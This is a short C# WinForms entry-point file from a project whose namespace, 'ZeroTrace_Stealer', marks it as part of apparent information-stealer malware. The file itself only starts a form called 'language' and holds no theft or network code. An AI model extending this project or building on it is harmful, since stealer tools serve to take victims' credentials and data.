using DevExpress.Skins;
using DevExpress.UserSkins;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Windows.Forms;

namespace ZeroTrace_Stealer
{
    internal static class Program
    {
       
        [STAThread]
        static void Main()
        {

        



            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new language());
        }
    }
}